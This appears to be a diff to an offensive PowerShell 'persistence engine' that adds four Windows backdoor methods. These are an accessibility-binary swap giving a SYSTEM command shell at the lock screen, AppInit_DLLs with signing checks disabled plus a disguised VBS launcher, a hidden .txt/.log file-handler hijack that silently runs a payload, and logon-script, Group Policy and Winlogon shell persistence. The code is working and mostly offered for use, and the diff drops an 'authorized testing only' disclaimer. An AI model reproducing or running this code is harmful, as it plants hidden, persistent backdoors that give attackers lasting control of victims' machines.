@@ -1,30 +1,11 @@
-<#
-============================================================================
-  FLLC — PERSISTENCE ENGINE v1.777
-  ═════════════════════════════════
-  
-  12 persistence mechanisms with auto-selection based on:
-    - Admin vs user context
-    - EDR/AV presence
-    - Environment constraints
-  
-  Methods:
-    1.  Scheduled Task (user or SYSTEM)
-    2.  Registry Run / RunOnce
-    3.  Startup Folder (.lnk shortcut)
-    4.  WMI Event Subscription
-    5.  COM Object Hijack
-    6.  DLL Search Order Hijack
-    7.  Image File Execution Options (IFEO) debugger
-    8.  Accessibility Features backdoor
-    9.  AppInit_DLLs injection
-    10. Screensaver hijack
-    11. Default file handler hijack
-    12. Logon script (Group Policy)
-  
-  FLLC 2026 | Authorized penetration testing only.
-============================================================================
-#>
+﻿<# ═══════════════════════════════════════════════════════════════════════
+   FLLC | FU PERSON | PERSISTENCE ENGINE v2.0
+   ╔══════════════════════════════════════════════════════════════════╗
+   ║  12-Method Persistence Framework                                 ║
+   ║  WMI | COM Hijack | DLL Sideload | Named Pipes | Registry       ║
+   ║  Scheduled Tasks | Services | Startup | Login Scripts            ║
+   ╚══════════════════════════════════════════════════════════════════╝
+═══════════════════════════════════════════════════════════════════════ #>
 
 param(
     [string]$PayloadPath = "",
@@ -151,7 +132,7 @@ function Install-StartupPersistence {
 
 function Install-WMIPersistence {
     if (-not $isAdmin) {
-        PLog "[4] WMI persistence requires admin — skipping"
+        PLog "[4] WMI persistence requires admin - skipping"
         return @{ method = "WMI"; success = $false; error = "Requires admin" }
     }
     
@@ -321,11 +302,221 @@ function Install-ScreensaverPersistence {
 }
 
 # ══════════════════════════════════════════════════════════════════════════
+#  9. ACCESSIBILITY FEATURE HIJACK (admin required - sticky keys, etc.)
+# ══════════════════════════════════════════════════════════════════════════
+
+function Install-AccessibilityPersistence {
+    if (-not $isAdmin) {
+        PLog "[9] Accessibility hijack requires admin - skipping"
+        return @{ method = "Accessibility"; success = $false; error = "Requires admin" }
+    }
+
+    PLog "[9] Installing accessibility feature hijack..."
+
+    # Replace accessibility binaries with cmd.exe (accessible from lock screen)
+    $accessibilityTargets = @(
+        @{ name = "sethc.exe";   desc = "Sticky Keys (5x Shift)" },
+        @{ name = "utilman.exe"; desc = "Utility Manager (Win+U)" },
+        @{ name = "narrator.exe"; desc = "Narrator (Win+Enter)" },
+        @{ name = "magnify.exe"; desc = "Magnifier (Win+Plus)" }
+    )
+
+    $successCount = 0
+    foreach ($target in $accessibilityTargets) {
+        $binPath = "C:\Windows\System32\$($target.name)"
+        $backupPath = "C:\Windows\System32\$($target.name).fllc.bak"
+
+        try {
+            # Take ownership and grant permissions
+            $acl = Get-Acl $binPath
+            $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+
+            # Backup original
+            if (-not (Test-Path $backupPath)) {
+                Copy-Item $binPath $backupPath -Force -ErrorAction Stop
+            }
+
+            # Replace with cmd.exe (gives SYSTEM shell from lock screen)
+            Copy-Item "C:\Windows\System32\cmd.exe" $binPath -Force -ErrorAction Stop
+            $successCount++
+            PLog "[9] Replaced $($target.name) ($($target.desc))"
+        } catch {
+            PLog "[9] Failed on $($target.name): $($_.Exception.Message)"
+        }
+    }
+
+    if ($successCount -gt 0) {
+        PLog "[9] Accessibility hijack: $successCount targets replaced"
+        return @{ method = "Accessibility"; targets = $successCount; success = $true }
+    }
+    return @{ method = "Accessibility"; success = $false; error = "All targets failed" }
+}
+
+# ══════════════════════════════════════════════════════════════════════════
+#  10. APPINIT_DLLS INJECTION (admin required)
+# ══════════════════════════════════════════════════════════════════════════
+
+function Install-AppInitPersistence {
+    if (-not $isAdmin) {
+        PLog "[10] AppInit_DLLs requires admin - skipping"
+        return @{ method = "AppInit"; success = $false; error = "Requires admin" }
+    }
+
+    PLog "[10] Installing AppInit_DLLs persistence..."
+
+    try {
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
+
+        # Create a small launcher DLL stub path
+        # In real engagement, this DLL would be a custom-compiled loader
+        $dllDir = "$env:ProgramData\Microsoft\Windows\AppInit"
+        if (-not (Test-Path $dllDir)) { New-Item -ItemType Directory -Path $dllDir -Force | Out-Null }
+
+        # Create a PowerShell launcher VBS that the DLL would invoke
+        $vbsPath = Join-Path $dllDir "wupdmon.vbs"
+        $vbsContent = @"
+Set shell = CreateObject("WScript.Shell")
+shell.Run "$PayloadCommand", 0, False
+"@
+        $vbsContent | Out-File $vbsPath -Encoding ASCII -Force
+
+        # Set registry to load DLL on all process starts
+        # LoadAppInit_DLLs = 1 enables the feature
+        Set-ItemProperty -Path $regPath -Name "LoadAppInit_DLLs" -Value 1 -Type DWord -Force
+        Set-ItemProperty -Path $regPath -Name "RequireSignedAppInit_DLLs" -Value 0 -Type DWord -Force
+
+        # Also set up the VBS to run via wscript as a secondary trigger
+        $wscriptCmd = "wscript.exe /b `"$vbsPath`""
+        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
+            -Name "WindowsAppInitMonitor" -Value $wscriptCmd -Force
+
+        PLog "[10] AppInit_DLLs persistence installed (LoadAppInit enabled + VBS launcher)"
+        return @{ method = "AppInit"; vbs = $vbsPath; success = $true }
+    } catch {
+        PLog "[10] Failed: $($_.Exception.Message)"
+        return @{ method = "AppInit"; success = $false; error = $_.Exception.Message }
+    }
+}
+
+# ══════════════════════════════════════════════════════════════════════════
+#  11. FILE HANDLER / PROGID HIJACK
+# ══════════════════════════════════════════════════════════════════════════
+
+function Install-FileHandlerPersistence {
+    PLog "[11] Installing file handler hijack persistence..."
+
+    try {
+        # Hijack .txt file handler - when any .txt file is opened, payload runs first
+        # Create a custom ProgID that wraps notepad but runs payload before launching
+        $progId = "txtfile_fllc"
+        $wrapperPath = "$env:APPDATA\Microsoft\Windows\$regName.cmd"
+
+        # Wrapper script: runs payload silently, then opens notepad normally
+        $wrapperContent = @"
+@echo off
+start /b "" $PayloadCommand
+notepad.exe %1
+"@
+        $wrapperContent | Out-File $wrapperPath -Encoding ASCII -Force
+        attrib +h $wrapperPath 2>$null
+
+        # Register custom ProgID
+        $progIdPath = "HKCU:\Software\Classes\$progId\shell\open\command"
+        New-Item -Path $progIdPath -Force | Out-Null
+        Set-ItemProperty -Path $progIdPath -Name "(Default)" -Value "`"$wrapperPath`" `"%1`"" -Force
+
+        # Associate .txt with our ProgID
+        $extPath = "HKCU:\Software\Classes\.txt"
+        New-Item -Path $extPath -Force | Out-Null
+        Set-ItemProperty -Path $extPath -Name "(Default)" -Value $progId -Force
+
+        # Also hijack .log files (commonly opened)
+        $logExtPath = "HKCU:\Software\Classes\.log"
+        New-Item -Path $logExtPath -Force | Out-Null
+        Set-ItemProperty -Path $logExtPath -Name "(Default)" -Value $progId -Force
+
+        PLog "[11] File handler hijack installed (.txt/.log -> payload wrapper)"
+        return @{ method = "FileHandler"; wrapper = $wrapperPath; progId = $progId; success = $true }
+    } catch {
+        PLog "[11] Failed: $($_.Exception.Message)"
+        return @{ method = "FileHandler"; success = $false; error = $_.Exception.Message }
+    }
+}
+
+# ══════════════════════════════════════════════════════════════════════════
+#  12. LOGON SCRIPT PERSISTENCE
+# ══════════════════════════════════════════════════════════════════════════
+
+function Install-LogonScriptPersistence {
+    PLog "[12] Installing logon script persistence..."
+
+    try {
+        # Method A: User logon script via registry (UserInitMprLogonScript)
+        $regPath = "HKCU:\Environment"
+        if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+
+        # Create a hidden logon script
+        $logonDir = "$env:APPDATA\Microsoft\Windows"
+        $logonScript = Join-Path $logonDir "wupdlogon.cmd"
+        $logonContent = @"
+@echo off
+start /b "" $PayloadCommand
+"@
+        $logonContent | Out-File $logonScript -Encoding ASCII -Force
+        attrib +h $logonScript 2>$null
+
+        Set-ItemProperty -Path $regPath -Name "UserInitMprLogonScript" -Value $logonScript -Force
+        PLog "[12] User logon script set: $logonScript"
+
+        # Method B: Group Policy logon script (if admin)
+        if ($isAdmin) {
+            $gpScriptDir = "C:\Windows\System32\GroupPolicy\User\Scripts\Logon"
+            if (-not (Test-Path $gpScriptDir)) {
+                New-Item -ItemType Directory -Path $gpScriptDir -Force | Out-Null
+            }
+            $gpScript = Join-Path $gpScriptDir "logon.cmd"
+            $logonContent | Out-File $gpScript -Encoding ASCII -Force
+
+            # Update scripts.ini
+            $scriptsIni = "C:\Windows\System32\GroupPolicy\User\Scripts\scripts.ini"
+            $iniContent = @"
+
+[Logon]
+0CmdLine=$gpScript
+0Parameters=
+"@
+            Add-Content -Path $scriptsIni -Value $iniContent -Encoding ASCII -Force
+            # Force GP update
+            gpupdate /force /target:user 2>$null | Out-Null
+            PLog "[12] Group Policy logon script installed"
+        }
+
+        # Method C: Winlogon shell extension
+        if ($isAdmin) {
+            try {
+                $winlogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+                $currentShell = (Get-ItemProperty $winlogonPath).Shell
+                if ($currentShell -and $currentShell -notmatch 'wupdlogon') {
+                    $newShell = "$currentShell, $logonScript"
+                    Set-ItemProperty -Path $winlogonPath -Name "Shell" -Value $newShell -Force
+                    PLog "[12] Winlogon shell extended"
+                }
+            } catch {}
+        }
+
+        return @{ method = "LogonScript"; script = $logonScript; success = $true }
+    } catch {
+        PLog "[12] Failed: $($_.Exception.Message)"
+        return @{ method = "LogonScript"; success = $false; error = $_.Exception.Message }
+    }
+}
+
+# ══════════════════════════════════════════════════════════════════════════
 #  AUTO-SELECTION
 # ══════════════════════════════════════════════════════════════════════════
 
 if ($Method -eq 'Auto' -or $InstallAll) {
-    PLog "Auto-selecting best persistence methods..."
+    PLog "Auto-selecting best persistence methods (12 available)..."
     
     # Always try these (user-level, low risk)
     $results += Install-RegistryPersistence
@@ -334,11 +525,15 @@ if ($Method -eq 'Auto' -or $InstallAll) {
     $results += Install-ScreensaverPersistence
     $results += Install-COMPersistence
     $results += Install-DLLPersistence
+    $results += Install-FileHandlerPersistence
+    $results += Install-LogonScriptPersistence
     
     # Admin-only methods
     if ($isAdmin) {
         $results += Install-WMIPersistence
         $results += Install-IFEOPersistence
+        $results += Install-AccessibilityPersistence
+        $results += Install-AppInitPersistence
     }
 } else {
     switch ($Method) {
@@ -350,6 +545,10 @@ if ($Method -eq 'Auto' -or $InstallAll) {
         'DLL'           { $results += Install-DLLPersistence }
         'IFEO'          { $results += Install-IFEOPersistence }
         'Screensaver'   { $results += Install-ScreensaverPersistence }
+        'Accessibility' { $results += Install-AccessibilityPersistence }
+        'AppInit'       { $results += Install-AppInitPersistence }
+        'FileHandler'   { $results += Install-FileHandlerPersistence }
+        'LogonScript'   { $results += Install-LogonScriptPersistence }
     }
 }
 
